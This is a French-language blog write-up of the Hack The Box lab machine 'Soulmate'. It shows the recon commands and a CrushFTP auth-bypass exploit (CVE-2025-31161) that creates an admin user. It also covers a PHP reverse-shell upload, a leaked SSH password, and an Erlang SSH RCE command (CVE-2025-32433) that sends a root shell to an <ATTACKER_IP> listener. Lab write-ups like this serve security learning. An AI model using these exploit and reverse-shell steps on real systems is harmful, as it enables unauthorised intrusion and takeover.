<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Soulmate</title>
<meta name=description content="Platforme: Hack The Box Lien: Soulmate Niveau: Facile OS: Linux Soulmate présente une instance de CrushFTP découverte grâce à l’énumération des sous-domaines. …"><meta name=keywords content="HackTheBox,CVE-2025-31161,CVE-2025-32433,CrushFTP,Erlang"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-soulmate/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Soulmate"><meta property="og:description" content="Platforme: Hack The Box Lien: Soulmate Niveau: Facile OS: Linux Soulmate présente une instance de CrushFTP découverte grâce à l’énumération des sous-domaines. …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Soulmate/Soulmate.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Soulmate/Soulmate.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Soulmate"><meta name=twitter:description content="Platforme: Hack The Box Lien: Soulmate Niveau: Facile OS: Linux Soulmate présente une instance de CrushFTP découverte grâce à l’énumération des sous-domaines. …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-soulmate/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-soulmate/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Soulmate/Soulmate.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-soulmate/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-soulmate/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Soulmate</h1><small role=doc-subtitle></small><p class=post-date>5 min read |
<span class=post-date>14 Février 2026</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/cve-2025-31161>CVE-2025-31161</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/cve-2025-32433>CVE-2025-32433</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/crushftp>CrushFTP</a></li><li class=post-tag><a href=https://scorpiosec.com/fr/tags/erlang>Erlang</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Soulmate>Soulmate</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Soulmate présente une instance de <code>CrushFTP</code> découverte grâce à l’énumération des sous-domaines. La recherche de vulnérabilités permet d’identifier le <code>CVE-2025-31161</code>, qui est exploité afin de compromettre l’application de transfert de fichiers. En abusant d’une fonctionnalité de téléversement, nous obtenons un premier accès au système cible.</p><p>Après compromission, l’énumération du système révèle un script contenant des identifiants utilisateurs valides, ce qui nous permet de pivoter vers un autre compte. Une analyse plus approfondie met ensuite en évidence un service interne <code>Erlang SSH</code> vulnérable au <code>CVE-2025-32433</code>, lequel est exploité afin d’obtenir un accès avec les privilèges root.</p><p>Ce write-up présente également un chemin d’exploitation alternatif, plus court, et explique pourquoi une élévation directe de privilèges est possible dans ce scénario.</p><h1 id=balayage>Balayage</h1><pre tabindex=0><code>nmap -p- --min-rate 1000 -T4 --open -n -Pn -sC -sV -oA nmap/Soulmate {IP}
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2026-02-10 08:37 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.119.39
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.10s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>51979</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>, <span style=color:#d19a66>13554</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://soulmate.htb/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 46.47 seconds
</span></span></code></pre></div><p>Nmap trouve deux ports ouverts avec SSH (22) et http (80). De plus, nous avons une redirection vers <code>http://soulmate.htb/</code>.</p><pre tabindex=0><code>sudo echo &#34;{IP} soulmate.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h1 id=enumération>Enumération</h1><p>Sur <code>http://soulmate.htb/</code>, nous trouvons un site de rencontre.</p><p><img src=/images/HTB-Soulmate/soulmate_website.png alt="Soulmate website"></p><p>Nous créons un compte et nous nous connectons. Sur <code>http://soulmate.htb/profile.php</code>, nous disposons d&rsquo;une fonctionnalité de téléversement qui pourrait potentiellement être exploitable.</p><p><img src=/images/HTB-Soulmate/soulmate_website.png alt="upload picture feature"></p><p>Le brute-forcing des répertoires est infructueux. Nous ne trouvons que le répertoire « assets » auquel nous ne pouvons pas accéder.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soulmate.htb
</code></pre><p><img src=/images/HTB-Soulmate/sm_gobuster.png alt="Soulmate directory brute forcing"></p><p><img src=/images/HTB-Soulmate/sm_asset_noaccess.png alt="Soulmate asset directory no access"></p><p>Avec ffuf, nous trouvons un sous-domaine <code>ftp</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://soulmate.htb -H &#34;Host: FUZZ.soulmate.htb&#34; -ic -fs 154
</code></pre><p><img src=/images/HTB-Soulmate/sm_ffuf.png alt="Soulmate subdomain enumeration"></p><p>En visitant <code>http://ftp.soulmate.htb</code>, nous découvrons une instance <a href=https://www.crushftp.com/index.html>CrushFTP</a>.</p><p><img src=/images/HTB-Soulmate/sm_CrushFTP.png alt="Soulmate CrushFTP"></p><p>En recherchant des vulnérabilités, nous trouvons <a href=https://projectdiscovery.io/blog/crushftp-authentication-bypass>CVE-2025-31161</a> avec un PoC disponible <a href=https://github.com/Immersive-Labs-Sec/CVE-2025-31161>ici</a>.</p><blockquote><p>Cette vulnérabilité était initialement référencée sous le nom <code>CVE-2025-2825</code>, mais ce nom a été rejeté par le NIST et son numéro officiel est devenu <code>CVE-2025-31161</code>.</p></blockquote><h1 id=accès-initial>Accès Initial</h1><p>En exploitant cette vulnérabilité, nous pouvons créer un nouvel utilisateur doté de privilèges d&rsquo;administrateur.</p><pre tabindex=0><code>python3 cve-2025-31161.py --target_host ftp.soulmate.htb  --port 80 --target_user root --new_user kscorpio --password kscorpio
</code></pre><p><img src=/images/HTB-Soulmate/sm_auth_exploit.png alt="CrushFTP auth bypass exploit"></p><p>Nous nous connectons ensuite avec les identifiants créés.</p><p><img src=/images/HTB-Soulmate/sm_admin.png alt="CrushFTP dashboard"></p><p>Nous cliquons sur le menu hamburger dans le coin supérieur gauche, puis sur <code>Admin</code>.</p><p><img src=/images/HTB-Soulmate/crushftp_admin.png alt="CrushFTP admin dashboard "></p><p>Sur la nouvelle page, nous sélectionnons à nouveau l&rsquo;icône du menu hamburger, puis <code>User Manager</code>.</p><p><img src=/images/HTB-Soulmate/crushftp_usermanager.png alt="CrushFTP user manager"></p><p>Nous disposons de la liste de tous les utilisateurs et pouvons mettre à jour leur mot de passe grâce à nos privilèges d&rsquo;administrateur.</p><blockquote><p>J&rsquo;ai modifié le mot de passe de Ben. N&rsquo;oubliez pas de cliquer sur <code>Save</code> pour confirmer la modification du mot de passe.</p></blockquote><p><img src=/images/HTB-Soulmate/crushftp_pwd_update.png alt="CrushFTP password update"></p><p>Nous nous connectons en tant que <code>ben</code> et trouvons trois dossiers. Le dossier <code>webProd</code> contient tous les fichiers du site web.</p><p><img src=/images/HTB-Soulmate/crushftp_ben.png alt="CrushFTP ben dashboard"></p><p>Après l&rsquo;avoir sélectionnée, l&rsquo;option <code>Add files</code> devient disponible.</p><p><img src=/images/HTB-Soulmate/crushftp_addfiles.png alt="CrushFTP Add files options"></p><p>J&rsquo;ai téléchargé le shell web disponible à l&rsquo;adresse <code>/usr/share/webshells/php/php-reverse-shell.php</code> dans Kali Linux.</p><p><img src=/images/HTB-Soulmate/revshell_up_crushftp.png alt="CrushFTP reverse shell uploaded"></p><p>Visiter <code>http://soulmate.htb/rev.php</code> déclenche le revers shell et nous obtenons un shell en tant que <code>www-data</code>.</p><p><img src=/images/HTB-Soulmate/sm_foothold.png alt="Soulmate foothold"></p><p>Notre shell peut être amélioré à l&rsquo;aide des commandes suivantes</p><pre tabindex=0><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
export TERM=xterm
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
</code></pre><h1 id=elévation-de-privilèges>Elévation de Privilèges</h1><p>Pour l&rsquo;énumération du système, exécutons <a href=https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>linPEAS</a>.</p><p>Nous trouvons quelques scripts Erlang que nous devrions examiner.</p><p><img src=/images/HTB-Soulmate/sm_escript_files.png alt="Soulmate escript files"></p><p>Le fichier <code>start.escript</code> est un mini lanceur de serveur SSH écrit en Erlang. Il démarre un daemon SSH lié à l&rsquo;hôte local sur le port 2222. Il enregistre également les tentatives d&rsquo;authentification et contient des informations d&rsquo;identification codées en dur.</p><p><img src=/images/HTB-Soulmate/ben_SSH_creds.png alt="Soulmate ben SSH credentials"></p><p>Le fichier <code>login.escript</code> est un script d&rsquo;audit des connexions SSH. Il enregistre les métadonnées des sessions SSH, écrit les journaux dans <code>syslog</code> via <code>logger</code> et dans <code>/var/log/erlang_login/session.log</code>.</p><blockquote><p><a href=https://ioflood.com/blog/logger-linux-command/>logger</a> est un outil en ligne de commande permettant d&rsquo;écrire des messages dans le journal système.</p></blockquote><p>Nous utilisons ces identifiants pour nous connecter via SSH en tant que <code>ben</code>, le mot de passe est <code>HouseH0ldings998</code>.</p><pre tabindex=0><code>ssh ben@soulmate.htb
</code></pre><p><img src=/images/HTB-Soulmate/sm_user.png alt="Soulmate user flag"></p><p>Le résultat de l&rsquo;exécution de linPEAS affiche également les ports internes.</p><p><img src=/images/HTB-Soulmate/sm_active_ports.png alt="Soulmate active ports"></p><p>Le script mentionnait un serveur SSH sur le port <code>2222</code>, vérifions cela. <code>netcat</code> est déjà installé sur la cible, nous pouvons donc essayer de récupérer la bannière SSH localement.</p><pre tabindex=0><code>nc 127.0.0.1 2222
</code></pre><p><img src=/images/HTB-Soulmate/sm_erlang_SSH.png alt="Erlang SSH banner"></p><p>Une simple recherche Google avec <code>SSH-2.0-Erlang/5.2.9 vulnerability</code> nous mène au <a href=https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433->CVE-2025-32433</a> avec un PoC <a href=https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC>ici</a>.</p><pre tabindex=0><code>python3 cve-2025-32433.py 127.0.0.1 -p 2222 --lhost &lt;ATTACKER_IP&gt; --lport &lt;ATTACKER_PORT&gt; --shell
</code></pre><p><img src=/images/HTB-Soulmate/sm_privesc.png alt="CVE-2025-32433 PoC"></p><p>Sur le listener, nous obtenons un shell root.</p><p><img src=/images/HTB-Soulmate/sm_root.png alt="Soulmate root shell"></p><h2 id=chemin-plus-court-vers-root>Chemin plus court vers root</h2><p>Nous pouvons passer directement du shell <code>www-data</code> à <code>root</code> en utilisant le même PoC.</p><p><img src=/images/HTB-Soulmate/wwwdata_to_root.png alt="www-data Erlang-SSH exploit"></p><p>Sur l&rsquo;écouteur, nous obtenons un shell root sans avoir à compromettre le compte <code>ben</code>.</p><p><img src=/images/HTB-Soulmate/wwwdata_to_root2.png alt="root shell from www-data"></p><p>Ce chemin d&rsquo;attaque plus court est possible car <code>CVE-2025-32433</code> est une vulnérabilité RCE pré-authentification dans le daemon SSH Erlang. Cela signifie que tout utilisateur local capable d&rsquo;atteindre le daemon SSH peut l&rsquo;exploiter (même sans identifiants valides).</p><p>L&rsquo;exploit donne un shell root parce que le daemon s&rsquo;exécute en tant que root en arrière-plan. Nous pouvons le vérifier en exécutant quelques commandes.</p><p>En exécutant <code>ss -lntp</code> en tant que <code>root</code>, nous voyons que le port 2222 appartient à <code>beam.smp</code> avec le PID <code>1144</code>.</p><p><img src=/images/HTB-Soulmate/beam_PID.png alt="Soulmate network info"></p><p>Vérifions maintenant qui est le propriétaire de ce processus.</p><pre tabindex=0><code>ps -p 1144 -o user,uid,cmd
</code></pre><p><img src=/images/HTB-Soulmate/PID_owner.png alt="PID owner"></p><p>Le résultat de la commande confirme que le daemon s&rsquo;exécute en tant que root.</p><ul><li>L&rsquo;utilisateur est <code>root</code></li><li>L&rsquo;UID est <code>0</code></li><li>Il exécute `/usr/local/lib/erlang_login/start.escript</li></ul><blockquote><p>Cette courte chaîne d&rsquo;exploitation ne fonctionnerait pas si la machine avait été mise à jour avec une version patchée d&rsquo;Erlang ou si le daemon avait été exécuté sous un utilisateur à faible privilège.</p></blockquote><p>Cela nous rappelle que les services locaux peuvent également être exploités par des acteurs malveillants une fois qu&rsquo;ils ont accès à un système, et que les daemons vulnérables appartenant à root constituent un moyen direct pour compromettre entièrement un système.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-previous/>&#8592;
Précédent:
HTB: Previous</a></p><p class=prev-post-date>février 11, 2026</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès Initial</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#chemin-plus-court-vers-root>Chemin plus court vers root</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2026 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>